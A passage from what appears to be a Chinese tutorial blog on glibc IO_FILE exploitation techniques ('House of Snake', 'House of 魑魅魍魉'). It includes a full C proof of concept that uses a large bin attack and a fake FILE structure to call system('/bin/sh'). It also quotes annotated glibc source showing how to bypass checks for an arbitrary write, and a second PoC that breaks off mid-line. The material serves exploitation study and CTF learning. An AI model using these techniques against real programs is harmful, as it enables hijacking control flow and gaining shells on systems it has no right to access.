<li><code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> &lt;&#x3D;&#x3D;&gt; <code>file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1</code></li>
</ul>
</li>
<li>在 <code>obstack_1grow</code> 宏定义中：<ul>
<li><code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit</code></li>
<li><code>(h)-&gt;use_extra_arg</code> 不为 0 &lt;&#x3D;&#x3D;&gt; <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0</code></li>
</ul>
</li>
</ul>
<p>最终调用 <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunkfun((struct __printf_buffer_obstack *) file-&gt;obstack-&gt;extra_arg)</code> 。</p>
<p>具体构造如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/0c9e82b6d37adf715968b6b9b18c2815.png"
                      alt="在这里插入图片描述"
                ><br><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_snake" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint-gcc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> &#123;</span></span><br><span class="line">    __printf_buffer_mode_failed,</span><br><span class="line">    __printf_buffer_mode_sprintf,</span><br><span class="line">    __printf_buffer_mode_snprintf,</span><br><span class="line">    __printf_buffer_mode_sprintf_chk,</span><br><span class="line">    __printf_buffer_mode_to_file,</span><br><span class="line">    __printf_buffer_mode_asprintf,</span><br><span class="line">    __printf_buffer_mode_dprintf,</span><br><span class="line">    __printf_buffer_mode_strfmon,</span><br><span class="line">    __printf_buffer_mode_fp,            <span class="comment">/* For __printf_fp_l_buffer.  */</span></span><br><span class="line">    __printf_buffer_mode_fp_to_wide,    <span class="comment">/* For __wprintf_fp_l_buffer.  */</span></span><br><span class="line">    __printf_buffer_mode_fphex_to_wide, <span class="comment">/* For __wprintf_fphex_l_buffer.  */</span></span><br><span class="line">    __printf_buffer_mode_obstack,       <span class="comment">/* For __printf_buffer_flush_obstack.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *write_base;</span><br><span class="line">    <span class="type">char</span> *write_ptr;</span><br><span class="line">    <span class="type">char</span> *write_end;</span><br><span class="line">    <span class="type">uint64_t</span> written;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leak libc_base.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x74960</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijack _IO_list_all by large bin attack.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2680</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct fake file.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_printf_buffer_as_file = large - <span class="number">2</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span> *<span class="title">fake_printf_buffer_obstack</span> =</span> fake_printf_buffer_as_file + <span class="number">29</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_obstack = (<span class="type">size_t</span> *) &amp;fake_printf_buffer_obstack-&gt;obstack;</span><br><span class="line">    <span class="type">char</span> *arg = (<span class="type">char</span> *) &amp;fake_obstack[<span class="number">11</span>];</span><br><span class="line">    <span class="type">size_t</span> IO_printf_buffer_as_file_jumps = libc_base + <span class="number">0x1cdd60</span>;<span class="comment">// _IO_printf_buffer_as_file_jumps</span></span><br><span class="line"></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">4</span>] = <span class="number">0</span>;                                           <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_printf_buffer_obstack-&gt;ch + <span class="number">1</span>;<span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">6</span>] = fake_printf_buffer_as_file[<span class="number">5</span>];               <span class="comment">// _IO_write_end</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">27</span>] = IO_printf_buffer_as_file_jumps;             <span class="comment">// vtable</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">28</span>] = (<span class="type">size_t</span>) fake_printf_buffer_obstack;        <span class="comment">//next</span></span><br><span class="line"></span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.write_base = <span class="number">0</span>;</span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.write_ptr = <span class="number">0</span>;</span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.write_end = (<span class="type">char</span> *) fake_printf_buffer_as_file[<span class="number">5</span>];</span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.mode = __printf_buffer_mode_obstack;</span><br><span class="line">    fake_printf_buffer_obstack-&gt;obstack = (<span class="keyword">struct</span> obstack *) &amp;fake_printf_buffer_obstack-&gt;obstack;</span><br><span class="line"></span><br><span class="line">    fake_obstack[<span class="number">7</span>] = (<span class="type">size_t</span>) system;</span><br><span class="line">    fake_obstack[<span class="number">9</span>] = (<span class="type">size_t</span>) arg;</span><br><span class="line">    fake_obstack[<span class="number">10</span>] = <span class="number">0x1</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger FSOP.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="House-of-魑魅魍魉"><a href="#House-of-魑魅魍魉" class="headerlink" title="House of 魑魅魍魉"></a>House of 魑魅魍魉</h2><p>一般来说一类跳表只有一个，但 <code>_IO_helper_jumps</code> 比较特殊，通过下面可以看出，跳表会根据 <code>COMPILE_WPRINTF</code> 值不同而生成不同的，但可能 libc 在编译时调用两次，所以<strong>我们可以在内存中看到两个 <code>_IO_helper_jumps</code> ，</strong>每种各一个。其中，**<code>COMPILE_WPRINTF == 0</code> 先生成，<code>COMPILE_WPRINTF == 1</code> 后生成。**</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_helper_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT (finish, _IO_wdefault_finish),</span><br><span class="line">  JUMP_INIT (overflow, _IO_helper_overflow),</span><br><span class="line">  JUMP_INIT (underflow, _IO_default_underflow),</span><br><span class="line">  JUMP_INIT (uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT (xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT (seekoff, _IO_default_seekoff),</span><br><span class="line">  JUMP_INIT (seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT (setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT (sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT (doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT (read, _IO_default_read),</span><br><span class="line">  JUMP_INIT (write, _IO_default_write),</span><br><span class="line">  JUMP_INIT (seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT (close, _IO_default_close),</span><br><span class="line">  JUMP_INIT (stat, _IO_default_stat)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_helper_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT (finish, _IO_default_finish),</span><br><span class="line">  JUMP_INIT (overflow, _IO_helper_overflow),</span><br><span class="line">  JUMP_INIT (underflow, _IO_default_underflow),</span><br><span class="line">  JUMP_INIT (uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT (pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT (xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT (xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT (seekoff, _IO_default_seekoff),</span><br><span class="line">  JUMP_INIT (seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT (setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT (sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT (doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT (read, _IO_default_read),</span><br><span class="line">  JUMP_INIT (write, _IO_default_write),</span><br><span class="line">  JUMP_INIT (seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT (close, _IO_default_close),</span><br><span class="line">  JUMP_INIT (stat, _IO_default_stat)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>同样，面对不同的 <code>COMPILE_WPRINTF</code> 所对应的 <code>helper_file</code> 也有所不同，区别在于是否需要伪造 <code>struct _IO_wide_data _wide_data;</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">helper_file</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> _<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    FILE *_put_stream;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></div>

<p>同样，<code>_IO_helper_overflow</code> 这个函数在内存中也有 2 份。通过测试发现，如果使用 <code>COMPILE_WPRINTF == 0</code> 的情况，在攻击过程中 <code>s-&gt;_IO_write_base</code> 会变成 <code>largebin-&gt;fd_nextsize</code> 指针，从而被强制修改无法控制。为了方便，我们使用 <code>COMPILE_WPRINTF == 1</code> 所生成的 <code>_IO_helper_overflow</code> 。该函数在攻击过程中的作用是控制 <code>_IO_default_xsputn</code> 的三个参数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _IO_helper_overflow (FILE *s, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *target = ((<span class="keyword">struct</span> helper_file*) s)-&gt;_put_stream;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="type">int</span> used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (used)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 利用这个链，显然这三个参数我们都可控。</span></span><br><span class="line">      <span class="type">size_t</span> written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used);</span><br><span class="line">      <span class="keyword">if</span> (written == <span class="number">0</span> || written == WEOF)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">      __wmemmove (s-&gt;_wide_data-&gt;_IO_write_base,</span><br><span class="line">          s-&gt;_wide_data-&gt;_IO_write_base + written,</span><br><span class="line">          used - written);</span><br><span class="line">      s-&gt;_wide_data-&gt;_IO_write_ptr -= written;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">// 如果使用这条链，_IO_write_ptr 将处于 largebin 的 bk_size 指针处</span></span><br><span class="line">  <span class="type">int</span> used = s-&gt;_IO_write_ptr - s-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (used)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> written = _IO_sputn (target, s-&gt;_IO_write_base, used);</span><br><span class="line">      <span class="keyword">if</span> (written == <span class="number">0</span> || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      memmove (s-&gt;_IO_write_base, s-&gt;_IO_write_base + written,</span><br><span class="line">           used - written);</span><br><span class="line">      s-&gt;_IO_write_ptr -= written;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> PUTC (c, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过上面函数可以清楚看出，在执行 <code>size_t written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used);</code> 时</p>
<ul>
<li><code>FILE *target = ((struct helper_file*) s)-&gt;_put_stream;</code> 可控。</li>
<li><code>s-&gt;_wide_data-&gt;_IO_write_base</code> 可控。</li>
<li><code>int used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base;</code> 可控。</li>
</ul>
<p>就达成了3个参数可控的要求，然后通过修改 <code>((struct helper_file*) s)-&gt;_put_stream</code> 的 <code>vtable</code> 指向 <code>_IO_str_jumps</code> ，使其调用 <code>_IO_default_xsputn</code> 函数。</p>
<p><strong>需要注意的是，<code>s-&gt;_wide_data-&gt;_IO_write_ptr</code> 和 <code>s-&gt;_wide_data-&gt;_IO_write_base</code> 是 <code>wchar_t *</code> 类型，也就是说used实际是 <code>(s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base) &gt;&gt; 2</code> 。</strong> （在 Linux 系统上，宽字符通常使用 UTF-32 编码表示，而 UTF-32 使用 32 位表示一个字符，因此 <code>wchar_t</code> 类型在 Linux 上通常为 4 字节。）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/da19e1e8f8bdd46028f20d7133c41b81.png"
                      alt="在这里插入图片描述"
                ><br><code>_IO_default_xsputn</code> 函数内要绕过的内容较多。该函数在攻击过程中的作用是两次调用 <code>__mempcpy</code> ，第一次利用任意地址写修改 <code>__mempcpy</code> 对应的 got 表中的值，第二次调用 <code>__mempcpy</code> 劫持程序执行流。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="comment">// 要 more &gt; count，能再次返回执行 __mempcpy</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">          <span class="comment">// 要 count &gt; 20</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 利用此处实现 house of 借刀杀人，</span></span><br><span class="line">          <span class="comment">// 修改 memcpy 的内容为setcontext</span></span><br><span class="line">          <span class="comment">// 再次返回的时候就能够实现 house of 一骑当千</span></span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="type">ssize_t</span> i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">// 要 more &gt; count，能再次返回执行 __mempcpy</span></span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 绕过下面这一行，再次执行for循环的内容</span></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF) </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure></div>

<p>需要绕过内容总结如下</p>
<ul>
<li><p>需要 <code>more</code> &gt; <code>count</code>，能再次返回执行 <code>__mempcpy</code>，且要想再次返回执行 <code>memcpy</code>，由于此时 <code>f-&gt;_IO_write_ptr</code> 被  <code>_IO_str_overflow</code> 函数修改为指向 <code>&quot;/bin/sh&quot;</code> 字符串，因此 <code> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code> 可能为一个很大的值，导致 <code>count &gt; more</code>，进而更新 <code>count</code> 为 <code>more</code> ，因此再次循环时要求 <code>more &gt; 20</code> 。由于上一次循环中依次执行了 <code>more -= count</code> 和 <code>more--</code> 语句，因此要求 <code>more</code> ≥ <code>count + 1 + 21</code> 。 </p>
</li>
<li><p>需要 <code>count</code> &gt; 20，因此 <code>count</code> 至少为 21 。 </p>
</li>
<li><p>第一次执行 <code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 时，</p>
<ul>
<li><p><code>_IO_write_ptr</code> 为 <code>__mempcpy</code> 表项，</p>
</li>
<li><p>s 为要写入的内容。</p>
</li>
</ul>
</li>
<li><p>再次执行<code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 时，</p>
<ul>
<li><p>需要绕过 <code>if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)</code> ，具体绕过方式接下来会介绍。</p>
</li>
<li><p><code>f-&gt;_IO_write_ptr</code> 为 <code>rdi</code> ，<code>s</code> 为 <code>rsi</code> ，<code>count</code> 为 <code>rdx</code> 。</p>
</li>
</ul>
</li>
</ul>
<p>同样，执行 <code>_IO_str_overflow</code> 需要绕过内容也比较多。该函数的作用是控制 <code>fp-&gt;_IO_write_ptr</code> ，从而控制 <code>_IO_default_xsputn</code> 第二次循环中 <code>__mempcpy</code> 的第一个参数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">    <span class="comment">// 需要进入来控制 fp-&gt;_IO_write_ptr ， _flags==0x400</span></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; <span class="comment">// 控制 fp-&gt;_IO_write_ptr 指向 &amp;&quot;/bin/sh&quot; - 1 作为下一次 memcpy(system) 的第一个参数。</span></span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="comment">// 不能进入，要让 _IO_blen (fp)  ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 足够大。</span></span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"> </span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">      <span class="comment">// 此处 fp-&gt;_IO_write_ptr 自加1，所以之前要少1.</span></span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure></div>

<p>需要绕过内容总结如下：</p>
<ul>
<li><code>_flags = 0x400</code> 。</li>
<li><code>fp-&gt;_IO_read_ptr</code> 为再次执行 <code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 的 <code>rdi - 1</code> 。</li>
<li><code>(fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</code> 要足够大，一般设置 <code>(fp)-&gt;_IO_buf_end = 0xFFFFFFFFFFFFFFF0</code> 即可。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/60649d737092dba6af8cb8c9977061aa.png"
                      alt="在这里插入图片描述"
                ></p>
<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_cmwl" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x77040</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2660</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *fake_helper_file = large - 